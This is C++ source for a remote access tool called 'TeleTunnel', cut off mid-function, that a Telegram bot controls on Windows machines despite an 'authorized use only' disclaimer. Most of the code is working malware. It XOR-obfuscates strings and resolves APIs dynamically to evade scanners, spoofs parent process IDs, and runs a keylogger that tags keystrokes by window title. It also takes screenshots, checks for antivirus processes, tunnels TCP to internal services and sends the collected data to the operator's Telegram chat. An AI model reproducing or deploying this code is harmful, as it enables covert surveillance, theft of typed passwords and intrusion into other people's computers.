// ============================================================
//  TeleTunnel v2.0
//  Telegram-based remote access utility for Windows
//  For authorized use on systems you own only.
// ============================================================
#define _WIN32_WINNT 0x0601
#define WINVER       0x0601

#include "./config.h" 

#include <windows.h>
#include <wininet.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <gdiplus.h>
#include <ole2.h>

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <iomanip>
#include <map>
#include <memory>
#include <queue>
#include <regex>
#include <sstream>
#include <string>
#include <vector>

#include <./nlohmann/json.hpp>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "iphlpapi.lib")

// ── MinGW compatibility shims ──────────────────────────────────
#define _stricmp lstrcmpiA

#ifndef GetTickCount64
static inline ULONGLONG GetTickCount64() { return (ULONGLONG)GetTickCount(); }
#endif

#ifndef LPPROC_THREAD_ATTRIBUTE_LIST_DEFINED
#define LPPROC_THREAD_ATTRIBUTE_LIST_DEFINED
typedef void* PPROC_THREAD_ATTRIBUTE_LIST;
typedef void* LPPROC_THREAD_ATTRIBUTE_LIST;
#endif

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
  #define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif
#ifndef EXTENDED_STARTUPINFO_PRESENT
  #define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

#ifndef STARTUPINFOEXA
typedef struct _STARTUPINFOEXA {
    STARTUPINFOA             StartupInfo;
    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
#endif

#ifndef RTL_OSVERSIONINFOW
typedef struct _RTL_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize;
    ULONG dwMajorVersion;
    ULONG dwMinorVersion;
    ULONG dwBuildNumber;
    ULONG dwPlatformId;
    WCHAR szCSDVersion[128];
} RTL_OSVERSIONINFOW, *PRTL_OSVERSIONINFOW;
#endif

using json = nlohmann::json;

// ============================================================
// § 1  CONSTANTS
// ============================================================
namespace Cfg {
    constexpr int    POLL_TIMEOUT_S      = 60;
    constexpr int    CMD_TIMEOUT_MS      = 15'000;
    constexpr int    RECONNECT_DELAY_MS  = 5'000;
    constexpr int    ANTISPIN_SLEEP_MS   = 2'000;
    constexpr int    ANTISPIN_THRESH_MS  = 1'000;
    constexpr int    SENDER_SLEEP_MS     = 100;
    constexpr size_t MSG_MAX_CHARS       = 4'000;
    constexpr size_t FILE_THRESHOLD      = 8'192;
    constexpr int    MAX_DROPPED_FILES   = 20;
    constexpr int    MAX_AV_DISPLAY      = 5;
    constexpr int    MAX_NET_ADAPTERS    = 5;
    constexpr int    SOCKET_LONG_TO_MS   = 300'000;
    constexpr int    SOCKET_SHORT_TO_MS  = 2'000;

    // API
    const std::string TOKEN   = TT_BOT_TOKEN;
    const std::string CHAT_ID = TT_CHAT_ID;
    const std::string API_HOST = "api.telegram.org";
    const std::string API_PATH = "/bot" + TOKEN;
}

// ============================================================
// § 2  STRING OBFUSCATION
//      WE use XOR to keeps sensitive strings out of .rdata
// ============================================================
namespace Obf {
    constexpr uint8_t KEY = 0x5C;

    template<size_t N>
    struct Str {
        uint8_t buf[N]{};
        constexpr explicit Str(const char (&s)[N]) {
            for (size_t i = 0; i < N; ++i) buf[i] = static_cast<uint8_t>(s[i]) ^ KEY;
        }
        std::string decode() const {
            std::string r(N - 1, '\0');
            for (size_t i = 0; i < N - 1; ++i) r[i] = static_cast<char>(buf[i] ^ KEY);
            return r;
        }
    };
}
// Wrap a string literal in XOR at compile time, decode at call site
#define OBF(s) (Obf::Str<sizeof(s)>(s).decode())

// ============================================================
// § 3  WIN32 THREADING PRIMITIVES
// ============================================================
class Mutex {
    CRITICAL_SECTION cs_;
public:
    Mutex()  { InitializeCriticalSection(&cs_); }
    ~Mutex() { DeleteCriticalSection(&cs_); }
    void lock()   { EnterCriticalSection(&cs_); }
    void unlock() { LeaveCriticalSection(&cs_); }
    PCRITICAL_SECTION native() { return &cs_; }
};

struct LockGuard {
    explicit LockGuard(Mutex& m) : m_(m) { m_.lock(); }
    ~LockGuard() { m_.unlock(); }
private:
    Mutex& m_;
};

class CondVar {
    CONDITION_VARIABLE cv_;
public:
    CondVar() { InitializeConditionVariable(&cv_); }
    void wait(Mutex& m) { SleepConditionVariableCS(&cv_, m.native(), INFINITE); }
    template<typename Pred>
    void wait(Mutex& m, Pred pred) { while (!pred()) wait(m); }
    void notify() { WakeConditionVariable(&cv_); }
};

// ============================================================
// § 4  DYNAMIC API RESOLUTION
//      Store as void*, cast at call site  avoids __stdcall
// ============================================================
namespace DynAPI {
    static void* pInitProcAttr   = nullptr;
    static void* pUpdateProcAttr = nullptr;
    static void* pDeleteProcAttr = nullptr;
    static void* pSetWinHookExA  = nullptr;
    static void* pRtlGetVersion  = nullptr;

    static BOOL  InitProcAttr  (LPPROC_THREAD_ATTRIBUTE_LIST l, DWORD a, DWORD b, PSIZE_T s) {
        return ((BOOL(WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST,DWORD,DWORD,PSIZE_T))pInitProcAttr)(l,a,b,s);
    }
    static BOOL  UpdateProcAttr(LPPROC_THREAD_ATTRIBUTE_LIST l, DWORD a, DWORD_PTR b, PVOID c, SIZE_T d, PVOID e, PSIZE_T f) {
        return ((BOOL(WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST,DWORD,DWORD_PTR,PVOID,SIZE_T,PVOID,PSIZE_T))pUpdateProcAttr)(l,a,b,c,d,e,f);
    }
    static VOID  DeleteProcAttr(LPPROC_THREAD_ATTRIBUTE_LIST l) {
        ((VOID(WINAPI*)(LPPROC_THREAD_ATTRIBUTE_LIST))pDeleteProcAttr)(l);
    }
    static HHOOK SetWinHookExA (int t, HOOKPROC p, HINSTANCE h, DWORD tid) {
        return ((HHOOK(WINAPI*)(int,HOOKPROC,HINSTANCE,DWORD))pSetWinHookExA)(t,p,h,tid);
    }
    static LONG  RtlGetVersion (PRTL_OSVERSIONINFOW p) {
        return ((LONG(WINAPI*)(PRTL_OSVERSIONINFOW))pRtlGetVersion)(p);
    }

    inline bool init() {
        HMODULE k32   = GetModuleHandleA(OBF("kernel32.dll").c_str());
        HMODULE u32   = LoadLibraryA(OBF("user32.dll").c_str());
        HMODULE ntdll = GetModuleHandleA(OBF("ntdll.dll").c_str());
        if (!k32 || !u32 || !ntdll) return false;

        pInitProcAttr   = (void*)GetProcAddress(k32,   OBF("InitializeProcThreadAttributeList").c_str());
        pUpdateProcAttr = (void*)GetProcAddress(k32,   OBF("UpdateProcThreadAttribute").c_str());
        pDeleteProcAttr = (void*)GetProcAddress(k32,   OBF("DeleteProcThreadAttributeList").c_str());
        pSetWinHookExA  = (void*)GetProcAddress(u32,   OBF("SetWindowsHookExA").c_str());
        pRtlGetVersion  = (void*)GetProcAddress(ntdll, OBF("RtlGetVersion").c_str());

        return pInitProcAttr && pUpdateProcAttr && pDeleteProcAttr &&
               pSetWinHookExA && pRtlGetVersion;
    }
}

// ============================================================
// § 5  MESSAGE QUEUE  (text + binary documents)
// ============================================================
struct QueueItem {
    enum class Type { Text, Document } type = Type::Text;
    std::string            payload; 
    std::vector<uint8_t>   data; 
    std::string            filename;
};

// ============================================================
// § 6  WININET HTTPS HELPER
// ============================================================
class WinINet {
    HINTERNET hNet_  = nullptr;
    HINTERNET hConn_ = nullptr;

    void close() {
        if (hConn_) { InternetCloseHandle(hConn_); hConn_ = nullptr; }
        if (hNet_)  { InternetCloseHandle(hNet_);  hNet_  = nullptr; }
    }

    bool connect() {
        if (hConn_) return true;
        // Mimic user-agent
        hNet_ = InternetOpenA(OBF("Mozilla/5.0 (Windows NT 10.0; Win64; x64)").c_str(),
                              INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
        if (!hNet_) return false;

        DWORD timeout = 120'000;
        InternetSetOption(hNet_, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

        hConn_ = InternetConnectA(hNet_, Cfg::API_HOST.c_str(),
                                  INTERNET_DEFAULT_HTTPS_PORT,
                                  nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConn_) { close(); return false; }
        return true;
    }

public:
    ~WinINet() { close(); }

    std::string request(const std::string& method, const std::string& path,
                        const std::string& body = "", const std::string& ct = "") {
        if (!connect()) return {};

        HINTERNET hReq = HttpOpenRequestA(hConn_, method.c_str(), path.c_str(),
                                          nullptr, nullptr, nullptr,
                                          INTERNET_FLAG_SECURE |
                                          INTERNET_FLAG_KEEP_CONNECTION |
                                          INTERNET_FLAG_RELOAD, 0);
        if (!hReq) { close(); return {}; }

        std::string headers;
        if (!ct.empty()) headers = "Content-Type: " + ct + "\r\n";

        BOOL ok = HttpSendRequestA(hReq,
                                   headers.empty() ? nullptr : headers.c_str(),
                                   static_cast<DWORD>(headers.size()),
                                   body.empty() ? nullptr : (LPVOID)body.c_str(),
                                   static_cast<DWORD>(body.size()));
        if (!ok) { InternetCloseHandle(hReq); close(); return {}; }

        std::string resp;
        char buf[4096];
        DWORD rd;
        while (InternetReadFile(hReq, buf, sizeof(buf), &rd) && rd > 0)
            resp.append(buf, rd);

        InternetCloseHandle(hReq);
        return resp;
    }

    std::vector<uint8_t> fetch(const std::string& url) {
        std::vector<uint8_t> out;
        HINTERNET hNet = InternetOpenA(OBF("Mozilla/5.0").c_str(),
                                       INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
        if (!hNet) return out;
        HINTERNET hUrl = InternetOpenUrlA(hNet, url.c_str(), nullptr, 0,
                                          INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD |
                                          INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (hUrl) {
            char tmp[8192]; DWORD rd;
            while (InternetReadFile(hUrl, tmp, sizeof(tmp), &rd) && rd > 0)
                out.insert(out.end(), tmp, tmp + rd);
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hNet);
        return out;
    }
};

// ============================================================
// § 7  SCREENSHOT section
// ============================================================
namespace Screenshot {
    using namespace Gdiplus;

    static int getEncoderClsid(const WCHAR* fmt, CLSID* clsid) {
        UINT num = 0, sz = 0;
        GetImageEncodersSize(&num, &sz);
        if (!sz) return -1;
        auto* info = static_cast<ImageCodecInfo*>(malloc(sz));
        if (!info) return -1;
        GetImageEncoders(num, sz, info);
        for (UINT i = 0; i < num; ++i)
            if (wcscmp(info[i].MimeType, fmt) == 0) { *clsid = info[i].Clsid; free(info); return i; }
        free(info); return -1;
    }

    std::vector<uint8_t> capture() {
        std::vector<uint8_t> result;
        GdiplusStartupInput gsi; ULONG_PTR tok;
        GdiplusStartup(&tok, &gsi, nullptr);
        {
            HDC hScreen = GetDC(nullptr);
            HDC hMem    = CreateCompatibleDC(hScreen);
            int w = GetSystemMetrics(SM_CXSCREEN);
            int h = GetSystemMetrics(SM_CYSCREEN);
            HBITMAP hBmp    = CreateCompatibleBitmap(hScreen, w, h);
            HBITMAP hOldBmp = static_cast<HBITMAP>(SelectObject(hMem, hBmp));
            BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
            hBmp = static_cast<HBITMAP>(SelectObject(hMem, hOldBmp));

            Bitmap bmp(hBmp, nullptr);
            CLSID pngClsid;
            getEncoderClsid(L"image/png", &pngClsid);
            IStream* pStream = nullptr;
            if (CreateStreamOnHGlobal(nullptr, TRUE, &pStream) == S_OK) {
                bmp.Save(pStream, &pngClsid, nullptr);
                LARGE_INTEGER li{}; pStream->Seek(li, STREAM_SEEK_SET, nullptr);
                STATSTG stat; pStream->Stat(&stat, STATFLAG_NONAME);
                result.resize(stat.cbSize.LowPart);
                ULONG rd; pStream->Read(result.data(), stat.cbSize.LowPart, &rd);
                pStream->Release();
            }
            DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(nullptr, hScreen);
        }
        GdiplusShutdown(tok);
        return result;
    }
}

// ============================================================
// § 8  PPID SPOOFER section
// This is probably the worst part cuz any descent EDR will
//      flag it ! I kept just for the learning purpose but do not
//      use this shit
// =================================================================
namespace PPIDSpoof {
    std::string spawn(DWORD parentPid, std::string cmd) {
        if (!DynAPI::pInitProcAttr || !DynAPI::pUpdateProcAttr || !DynAPI::pDeleteProcAttr)
            return "❌ DynAPI not initialized";

        HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);
        if (!hParent) return "❌ OpenProcess failed (PID " + std::to_string(parentPid) + ")";

        SIZE_T listSz = 0;
        DynAPI::InitProcAttr(nullptr, 1, 0, &listSz);
        auto* pAttr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, listSz);
        if (!pAttr) { CloseHandle(hParent); return "❌ HeapAlloc failed"; }

        if (!DynAPI::InitProcAttr(pAttr, 1, 0, &listSz)) {
            HeapFree(GetProcessHeap(), 0, pAttr); CloseHandle(hParent);
            return "❌ InitializeProcThreadAttributeList failed";
        }
        if (!DynAPI::UpdateProcAttr(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                      &hParent, sizeof(HANDLE), nullptr, nullptr)) {
            DynAPI::DeleteProcAttr(pAttr); HeapFree(GetProcessHeap(), 0, pAttr); CloseHandle(hParent);
            return "❌ UpdateProcThreadAttribute failed";
        }

        STARTUPINFOEXA si{}; si.StartupInfo.cb = sizeof(si);
        si.lpAttributeList = pAttr;
        si.StartupInfo.dwFlags    = STARTF_USESHOWWINDOW;
        si.StartupInfo.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};

        cmd.erase(0, cmd.find_first_not_of(" \t"));

        BOOL ok = CreateProcessA(nullptr, (char*)cmd.c_str(), nullptr, nullptr, FALSE,
                                 EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                                 nullptr, nullptr,
                                 reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);

        std::string result;
        if (ok) {
            std::string disp = cmd.size() > 80 ? cmd.substr(0, 80) + "..." : cmd;
            result = "✅ Spawned `" + disp + "` as child of PID " + std::to_string(parentPid) +
                     "\n🔢 New PID: " + std::to_string(pi.dwProcessId);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        } else {
            DWORD err = GetLastError();
            result = "[X] CreateProcess failed (error " + std::to_string(err) + ")";
            if (err == 2) result += "  file not found";
            if (err == 5) result += "  access denied";
        }

        DynAPI::DeleteProcAttr(pAttr); HeapFree(GetProcessHeap(), 0, pAttr); CloseHandle(hParent);
        return result;
    }
}

// ============================================================
// § 9  KEYLOGGER
// ============================================================
class KeyLogger {
    HHOOK   hook_      = nullptr;
    HANDLE  thread_    = nullptr;
    DWORD   threadId_  = 0;
    bool    active_    = false;
    Mutex   mu_;
    std::string  buf_;
    std::string  lastWin_;
    size_t       total_  = 0;

    static std::string vkToStr(DWORD vk, bool shift) {
        switch (vk) {
            case VK_RETURN:  return "\n";
            case VK_BACK:    return "[BS]";
            case VK_TAB:     return "[TAB]";
            case VK_SPACE:   return " ";
            case VK_ESCAPE:  return "[ESC]";
            case VK_DELETE:  return "[DEL]";
            case VK_LEFT:    return "[←]";  case VK_RIGHT: return "[→]";
            case VK_UP:      return "[↑]";  case VK_DOWN:  return "[↓]";
            case VK_HOME:    return "[HOME]"; case VK_END:  return "[END]";
            case VK_PRIOR:   return "[PGUP]"; case VK_NEXT: return "[PGDN]";
            case VK_CAPITAL: return "[CAPS]";
            case VK_SHIFT: case VK_LSHIFT:   case VK_RSHIFT:   return {};
            case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return {};
            case VK_MENU: case VK_LMENU: case VK_RMENU:        return {};
            case VK_LWIN: case VK_RWIN: return "[WIN]";
            default: break;
        }
        if (vk >= VK_F1 && vk <= VK_F12) return "[F" + std::to_string(vk - VK_F1 + 1) + "]";

        BYTE ks[256]{};
        if (shift) ks[VK_SHIFT] = 0x80;
        ks[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 1) ? 0x01 : 0x00;
        WCHAR wide[4]{}; int r = ToUnicodeEx(vk, 0, ks, wide, 4, 0, GetKeyboardLayout(0));
        if (r > 0) {
            char narrow[8]{}; WideCharToMultiByte(CP_UTF8, 0, wide, r, narrow, sizeof(narrow), nullptr, nullptr);
            return narrow;
        }
        std::stringstream ss; ss << "[0x" << std::hex << vk << "]"; return ss.str();
    }

    static LRESULT CALLBACK hookProc(int code, WPARAM wp, LPARAM lp) {
        if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
            if (g_instance) g_instance->onKey(reinterpret_cast<KBDLLHOOKSTRUCT*>(lp));
        return CallNextHookEx(nullptr, code, wp, lp);
    }

    void onKey(KBDLLHOOKSTRUCT* kb) {
        // Tag keystrokes by active window for context
        if (HWND fg = GetForegroundWindow()) {
            char title[256]{}; GetWindowTextA(fg, title, sizeof(title));
            std::string t(title);
            if (!t.empty() && t != lastWin_) {
                lastWin_ = t;
                LockGuard lg(mu_);
                buf_ += "\n\n[🪟 " + t + "]\n";
            }
        }
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        std::string key = vkToStr(kb->vkCode, shift);
        if (!key.empty()) { LockGuard lg(mu_); buf_ += key; ++total_; }
    }

    static DWORD WINAPI hookThread(LPVOID p) {
        auto* self = static_cast<KeyLogger*>(p);
        if (!DynAPI::pSetWinHookExA) return 1;
        self->hook_ = DynAPI::SetWinHookExA(WH_KEYBOARD_LL, hookProc, nullptr, 0);
        if (!self->hook_) return 1;
        MSG msg; while (self->active_ && GetMessage(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
        if (self->hook_) { UnhookWindowsHookEx(self->hook_); self->hook_ = nullptr; }
        return 0;
    }

public:
    static KeyLogger* g_instance;

    ~KeyLogger() { stop(); }

    bool start() {
        if (active_) return false;
        active_ = true; total_ = 0; buf_.clear(); lastWin_.clear();
        g_instance = this;
        thread_ = CreateThread(nullptr, 0, hookThread, this, 0, &threadId_);
        return thread_ != nullptr;
    }

    void stop() {
        if (!active_) return;
        active_ = false;
        if (threadId_) PostThreadMessage(threadId_, WM_QUIT, 0, 0);
        if (thread_)   { WaitForSingleObject(thread_, 3000); CloseHandle(thread_); thread_ = nullptr; }
        g_instance = nullptr;
    }

    bool isRunning() const { return active_; }

    // Returns and optionally clears the keystroke buffer
    std::string dump(bool clear = true) {
        LockGuard lg(mu_);
        std::string r = buf_;
        if (clear) { buf_.clear(); total_ = 0; }
        return r;
    }

    size_t count() { LockGuard lg(mu_); return total_; }
};

KeyLogger* KeyLogger::g_instance = nullptr;

// ============================================================
// § 10  SYSINFO
// ============================================================
namespace SysInfo {
    std::string collect() {
        std::stringstream ss;
        ss << "🛰 **ᴛᴇʟᴇᴛᴜɴɴᴇʟ sʏsᴛᴇᴍ ʀᴇᴘᴏʀᴛ**\n";
        ss << "────────────────────\n";

        // User / Host
        char buf[256]; DWORD sz = sizeof(buf);
        std::string user = "?", host = "?";
        if (GetUserNameA(buf, &sz)) user = buf; sz = sizeof(buf);
        if (GetComputerNameA(buf, &sz)) host = buf;
        ss << "`[ID] " << user << "@" << host << "`\n";

        // OS  uses RtlGetVersion to bypass compat shim
        std::string os = "Unknown";
        if (DynAPI::pRtlGetVersion) {
            RTL_OSVERSIONINFOW vi{}; vi.dwOSVersionInfoSize = sizeof(vi);
            if (DynAPI::RtlGetVersion(&vi) == 0) {
                HKEY hk; char prod[128]{}; DWORD psz = sizeof(prod); DWORD pt;
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                    0, KEY_READ, &hk) == ERROR_SUCCESS) {
                    RegQueryValueExA(hk, "ProductName", nullptr, &pt, (LPBYTE)prod, &psz);
                    RegCloseKey(hk);
                }
                os = std::string(prod[0] ? prod : "Windows") +
                     " (Build " + std::to_string(vi.dwBuildNumber) + ")";
            }
        }
        ss << "`[OS] " << os << "`\n\n";

        ss << "┌── **ʜᴀʀᴅᴡᴀʀᴇ sᴛᴀᴛs**\n";
        ss << "├──────────────────────\n";
        // CPU
        HKEY hk; char cpu[256]{}; DWORD csz = sizeof(cpu); DWORD ct;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
            0, KEY_READ, &hk) == ERROR_SUCCESS) {
            RegQueryValueExA(hk, "ProcessorNameString", nullptr, &ct, (LPBYTE)cpu, &csz);
            RegCloseKey(hk);
        }
        std::string cpuStr(cpu); cpuStr.erase(0, cpuStr.find_first_not_of(' '));
        size_t withPos = cpuStr.find(" with ");
        if (withPos != std::string::npos) cpuStr = cpuStr.substr(0, withPos);
        SYSTEM_INFO si{}; GetSystemInfo(&si);
        ss << "├── ▸ **CPU:** `" << (cpuStr.empty() ? "Unknown" : cpuStr)
           << "`\n"; // remove cores

        // RAM
        MEMORYSTATUSEX mem{}; mem.dwLength = sizeof(mem); GlobalMemoryStatusEx(&mem);
        long long usedRam = (mem.ullTotalPhys - mem.ullAvailPhys) / 1048576;
        long long totalRam = mem.ullTotalPhys / 1048576;
        int ramPct = (int)(usedRam * 100 / (totalRam ? totalRam : 1));
        ss << "├── ▸ **RAM:** `[" << ramPct << "%] " << usedRam << "/" << totalRam << " MB`\n";

        // Disk C:
        ULARGE_INTEGER freeB, totalB, totalFreeB;
        if (GetDiskFreeSpaceExA("C:\\", &freeB, &totalB, &totalFreeB)) {
            long long totalG = totalB.QuadPart / 1073741824ULL;
            long long freeG = freeB.QuadPart / 1073741824ULL;
            int diskPct = (int)((totalG - freeG) * 100 / (totalG ? totalG : 1));
            ss << "└── ▸ **Disk:** `[" << diskPct << "%] " << freeG << "/" << totalG << " Gb`\n\n";
        }

        ss << "┌── **ɴᴇᴛᴡᴏʀᴋ & ᴛɪᴍᴇ**\n";
        ss << "├──────────────────────\n";
        // Resolution
        ss << "├── ▸ **Display:** `" << GetSystemMetrics(SM_CXSCREEN) << "x" << GetSystemMetrics(SM_CYSCREEN) << "`\n";
        // Uptime
        DWORD us = static_cast<DWORD>(GetTickCount64() / 1000ULL);
        ss << "├── ▸ **Uptime:** `" << us/86400 << "d " << (us%86400)/3600 << "h " << (us%3600)/60 << "m`\n";

        // Network adapters  show only real Ethernet/WiFi
        ss << "├── ▸ **Network: **";
        ULONG flags = GAA_FLAG_INCLUDE_PREFIX;
        ULONG addrBufLen = 0;
        GetAdaptersAddresses(AF_INET, flags, nullptr, nullptr, &addrBufLen);
        std::vector<uint8_t> addrBuf(addrBufLen);
        auto* pAddrs = reinterpret_cast<IP_ADAPTER_ADDRESSES*>(addrBuf.data());
        if (GetAdaptersAddresses(AF_INET, flags, nullptr, pAddrs, &addrBufLen) == NO_ERROR) {
            int shown = 0;
            for (auto* a = pAddrs; a && shown < 3; a = a->Next) {
                if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;
                if (a->IfType == IF_TYPE_TUNNEL) continue;
                if (a->OperStatus != IfOperStatusUp) continue;
                char friendlyName[256] = {};
                WideCharToMultiByte(CP_UTF8, 0, a->FriendlyName, -1, friendlyName, sizeof(friendlyName), nullptr, nullptr);
                std::string fname(friendlyName);
                if (fname.find("Virtual") != std::string::npos ||
                    fname.find("VMware")  != std::string::npos ||
                    fname.find("VirtualBox") != std::string::npos ||
                    fname.find("vEthernet") != std::string::npos ||
                    fname.find("Loopback") != std::string::npos) continue;
                for (auto* ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
                    char ip[64] = {}; DWORD ipLen = sizeof(ip);
                    WSAAddressToStringA(ua->Address.lpSockaddr, ua->Address.iSockaddrLength, nullptr, ip, &ipLen);
                    ss << "│  `" << fname << "` → `" << ip << "`\n";
                    ++shown;
                }
            }
            if (shown == 0) ss << "│  No active adapter found\n";
        }

        // GPU
        HKEY hGpu; char gpuBuf[256]{}; DWORD gpuSz = sizeof(gpuBuf); DWORD gtype;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
            0, KEY_READ, &hGpu) == ERROR_SUCCESS) {
            RegQueryValueExA(hGpu, "DriverDesc", nullptr, &gtype, (LPBYTE)gpuBuf, &gpuSz);
            RegCloseKey(hGpu);
        }
        if (gpuBuf[0]) ss << "└── ▸ **GPU:** `" << gpuBuf << "`\n";

        // AV detection
        const char* avProcs[] = {
            "MsMpEng.exe", "avp.exe", "avgnt.exe", "ekrn.exe",
            "bdagent.exe", "mbam.exe", "ccSvcHst.exe", "mcshield.exe", nullptr
        };
        ss << "\n┌── **sᴇᴄᴜʀɪᴛʏ**\n";
        ss << "├──────────────────────\n";
        std::vector<std::string> found;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
            if (Process32First(hSnap, &pe))
                do { for (int i = 0; avProcs[i]; ++i)
                    if (_stricmp(pe.szExeFile, avProcs[i]) == 0) found.push_back(pe.szExeFile);
                } while (Process32Next(hSnap, &pe));
            CloseHandle(hSnap);
        }
        if (found.empty()) ss << "✓ Heheheeee No known AV detected !!\n";
        else for (const auto& a : found) ss << "├── ▸ `" << a << "` running\n";

        ss << "────────────────────";
        return ss.str();
    }
}

// ============================================================
// § 11  STREAM MANAGER
//    Thid manage TCP tunneling over Telegram to access internal services
// ============================================================
struct Stream {
    SOCKET socket  = INVALID_SOCKET;
    HANDLE thread  = nullptr;
    bool   active  = false;
    std::string lastPath;
};

class TelegramBot;

class StreamManager {
    std::map<std::string, std::unique_ptr<Stream>> streams_;
    Mutex mu_;
    TelegramBot& bot_; // back-reference

public:
    explicit StreamManager(TelegramBot& bot) : bot_(bot) {}

    void open(const std::string& id, const std::string& target);
    void send(const std::string& id, std::string data);
    void close(const std::string& id);
    std::string listAll();

    void onData(const std::string& id, const std::vector<uint8_t>& data);

private:
    static DWORD WINAPI readerThread(LPVOID p);
    void readLoop(const std::string& id, SOCKET sock);
};

// ============================================================
// § 12  TELEGRAM BOT
// ============================================================
class TelegramBot {
    WinINet              http_;
    Mutex                qMu_;
    CondVar              qCv_;
    std::queue<QueueItem> queue_;
    bool                 running_ = false;
    long long            offset_  = 0;
    std::vector<std::string> drops_; // for recently uploaded files

    KeyLogger    keylogger_;
    StreamManager streams_;

    // helpers ------
    std::string apiPath(const std::string& method) const {
        return Cfg::API_PATH + "/" + method;
    }

    void enqueue(QueueItem item) {
        LockGuard lg(qMu_); queue_.push(std::move(item)); qCv_.notify();
    }

public:
    TelegramBot() : streams_(*this) {}

    void sendText(const std::string& text) {
        QueueItem qi; qi.type = QueueItem::Type::Text; qi.payload = text; enqueue(std::move(qi));
    }
    void sendDocument(const std::string& caption, const std::vector<uint8_t>& data, const std::string& fn) {
        QueueItem qi; qi.type = QueueItem::Type::Document;
        qi.payload = caption; qi.data = data; qi.filename = fn; enqueue(std::move(qi));
    }

    void trackDrop(const std::string& path) {
        drops_.push_back(path);
        if (drops_.size() > static_cast<size_t>(Cfg::MAX_DROPPED_FILES)) drops_.erase(drops_.begin());
    }
    std::string resolveVar(const std::string& var) {
        if (var == "$LAST" && !drops_.empty()) return drops_.back();
        if (var.size() > 1 && var[0] == '$') {
            try { size_t idx = std::stoul(var.substr(1)) - 1;
                  if (idx < drops_.size()) return drops_[idx]; } catch (...) {}
        }
        return var;
    }

    void start() {
        running_ = true;
        sendHelp();
        HANDLE hs = CreateThread(nullptr, 0, senderThread,  this, 0, nullptr);
        HANDLE hp = CreateThread(nullptr, 0, pollerThread,  this, 0, nullptr);
        WaitForSingleObject(hs, INFINITE);
        WaitForSingleObject(hp, INFINITE);
    }

private:
    // loop ----
    void senderLoop() {
        while (running_) {
            qMu_.lock();
            qCv_.wait(qMu_, [this]{ return !queue_.empty() || !running_; });
            if (!running_) { qMu_.unlock(); break; }
            QueueItem item = std::move(queue_.front()); queue_.pop();
            qMu_.unlock();

            if (item.type == QueueItem::Type::Document) {
                sendDoc(item);
            } else {
                json body = { {"chat_id", Cfg::CHAT_ID}, {"text", item.payload}, {"parse_mode", "Markdown"} };
                http_.request("POST", apiPath("sendMessage"), body.dump(), "application/json");
            }
            Sleep(Cfg::SENDER_SLEEP_MS);
        }
    }

    void sendDoc(const QueueItem& item) {
        std::string boundary = "TeleTunnelBnd" + std::to_string(GetTickCount());
        std::string body;
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + Cfg::CHAT_ID + "\r\n";
        body += "--" + boundary + "\r\n";
        body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + item.filename + "\"\r\n";
        body += "Content-Type: application/octet-stream\r\n\r\n";
        body.append(reinterpret_cast<const char*>(item.data.data()), item.data.size());
        body += "\r\n--" + boundary + "--\r\n";
        http_.request("POST", apiPath("sendDocument"), body, "multipart/form-data; boundary=" + boundary);
    }

    // -----loop -------
    void pollerLoop() {
        while (running_) {
            std::string path = Cfg::API_PATH + "/getUpdates?offset=" + std::to_string(offset_) +
                               "&timeout=" + std::to_string(Cfg::POLL_TIMEOUT_S);
            DWORD t0 = GetTickCount();
            std::string resp = http_.request("GET", path);
            DWORD elapsed = GetTickCount() - t0;

            if (resp.empty()) { Sleep(Cfg::RECONNECT_DELAY_MS); continue; }

